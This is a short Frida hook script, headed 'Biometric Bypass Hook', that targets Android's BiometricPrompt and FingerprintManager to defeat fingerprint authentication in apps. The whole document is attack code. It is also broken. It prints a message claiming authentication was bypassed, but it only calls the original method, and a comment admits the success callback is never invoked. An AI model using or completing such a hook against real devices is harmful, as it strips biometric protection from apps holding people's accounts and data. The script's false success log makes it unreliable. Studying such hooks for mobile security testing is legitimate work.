/*
 * Biometric Bypass Hook
 * Targets: BiometricPrompt, FingerprintManager
 */
Java.perform(function() {
    var BiometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt');
    BiometricPrompt.authenticate.overload('android.hardware.biometrics.BiometricPrompt$CryptoObject', 'android.os.CancellationSignal', 'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback').implementation = function(crypto, signal, executor, callback) {
        console.log('[FRIDA] Bypassed Biometric Authentication');
        // Success code 1: BIOMETRIC_AUTHENTICATION_SUCCEEDED
        // We'd need to call the callback's onAuthenticationSucceeded here
        return this.authenticate(crypto, signal, executor, callback);
    };
});
